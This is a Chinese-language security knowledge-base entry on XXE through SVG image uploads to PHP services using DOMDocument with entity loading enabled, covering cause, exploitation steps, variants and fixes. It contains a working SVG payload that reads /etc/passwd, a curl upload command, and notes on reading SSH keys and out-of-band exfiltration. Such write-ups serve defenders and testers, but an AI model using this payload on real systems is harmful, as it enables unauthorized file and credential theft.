---
id: web-generic-xxe-svg-upload-inband-file-read
title: SVG 图片上传 XXE：image/svg+xml 解析外部实体读取任意文件
type: scenario
domain: web
path: web/generic/xxe
technique: svg-upload-xxe-inband-file-read
tags:
- web
- xxe
- file-upload
- svg
- libxml
- php
- file-read
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V81
  verified_at: '2026-11-05T17:48:00+08:00'
  notes: 已对照原文 Photographer 章节与 img17-19：upload.php 以 mime_content_type 放行 image/svg+xml、扩展名正则仅查尾部 g，DOMDocument loadXML 使用 LIBXML_NOENT|LIBXML_DTDLOAD 并 C14N() 回显；PoC SVG 与原文一致，未实测。
url: /docs/web/generic/xxe/web-generic-xxe-svg-upload-inband-file-read/
draft: false
kb_aliases:
- SVG XXE
- 图片上传 XXE
- image/svg+xml 外部实体
- DOMDocument LIBXML_NOENT
- SVG 任意文件读取
---

## 一句话结论

上传点只按 MIME/扩展名判断“图片”并允许 `image/svg+xml` 时，攻击者上传带 `<!ENTITY ... SYSTEM "file:///...">` 的 SVG；服务端若用 `DOMDocument::loadXML(..., LIBXML_NOENT | LIBXML_DTDLOAD)` 解析并把结果回显，外部实体就会在响应中展开，直接读出 `/etc/passwd` 等任意文件。

## 原理

- SVG 是 XML 格式，允许 `<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` 声明外部实体，并在 `<text>&xxe;</text>` 中引用。
- 很多图片上传点只检查扩展名/MIME 是否为图片：`image/svg+xml` 以 `image/` 开头、`svg` 也符合某些“2-3 个字母且以 g 结尾”的粗糙正则，因此 SVG 能绕过“只允许 jpg/png/gif”的限制。
- PHP 的 `DOMDocument::loadXML()` 默认不加载外部实体；但代码若显式调用 `libxml_disable_entity_loader(false)` 并传入 `LIBXML_NOENT | LIBXML_DTDLOAD`，就会解析 DTD 并把实体替换为文件内容。
- 若服务端随后把 SVG 规范化输出（如 `C14N()`）写回页面，文件内容会随 `<text>` 节点一起回显，形成有回显的 XXE；即使不回显，也可用外部 DTD/OOB 外带。
- 根因是“把 SVG 当普通图片处理，却用支持外部实体的 XML 解析器解析不可信内容”。

## 触发条件

- 上传接口允许 `image/svg+xml`（或扩展名校验可绕过到 `.svg`）；
- 服务端解析 SVG XML 时启用外部实体/DTD 加载；
- 解析结果会回显到响应，或有 OOB 通道；
- 攻击者能访问上传后的文件/预览接口。

## 利用步骤

1. 构造带外部实体的 SVG：
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <svg width="400" height="200" xmlns="http://www.w3.org/2000/svg">
     <text x="20" y="20">&xxe;</text>
   </svg>
   ```
2. 上传该 SVG（必要时改 Content-Type 为 `image/svg+xml`，扩展名 `.svg`）。
3. 访问预览/上传结果页面；若服务端回显规范化后的 SVG，`/etc/passwd` 内容会出现在 `<text>` 中。
4. 替换 `file:///etc/passwd` 读取其他文件（源码、配置、SSH 私钥）；无回显时改用外部 DTD 把内容拼到攻击者服务器 URL 外带。

## PoC

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<svg width="400" height="200" xmlns="http://www.w3.org/2000/svg">
  <text x="20" y="20">&xxe;</text>
</svg>
```

```bash
curl -F "file=@xxe.svg;type=image/svg+xml" http://target/upload.php
# 访问返回的图片/预览地址，响应中的 <text> 节点会包含 /etc/passwd 内容
```

## 变体与关联

- 变体：UTF-16/UTF-16BE 编码隐藏 `DOCTYPE` 绕过关键字过滤；参数实体/外部 DTD 做 OOB 外带；SVG 中引用 `php://filter` 读源码。
- 变体：上传点允许 SVG 但用 ImageMagick/其他解析器时，还可能触发 SSRF、ImageTrick 或命令执行。
- 关联：[[web-generic-xxe-inband-file-read-default-insecure]]（通用 XML 解析器 XXE）、[[web-generic-xxe-utf16be-encoding-filter-bypass]]（编码绕过）、[[web-generic-file-upload-html-static-stored-xss]]（SVG/HTML 上传的 XSS 面）。
- 边界：解析器禁用外部实体、SVG 被转成位图后再输出、上传内容被重编码时，本路径不成立。

## 检测与防御

- 修复：解析 SVG 前禁用外部实体与 DTD（`libxml_disable_entity_loader(true)`、`LIBXML_NONET`，不要用 `LIBXML_NOENT`/`LIBXML_DTDLOAD`）；优先用不含 XXE 的 SVG 清洗库。
- 加固：上传白名单只允许真正的位图格式（jpg/png/gif/webp），对 SVG 做严格清洗或直接禁止；上传文件重命名、放在不可执行目录、用独立域名提供。
- 检测：上传内容中出现 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://`、`php://` 等特征；解析服务出现异常文件读取或外连。
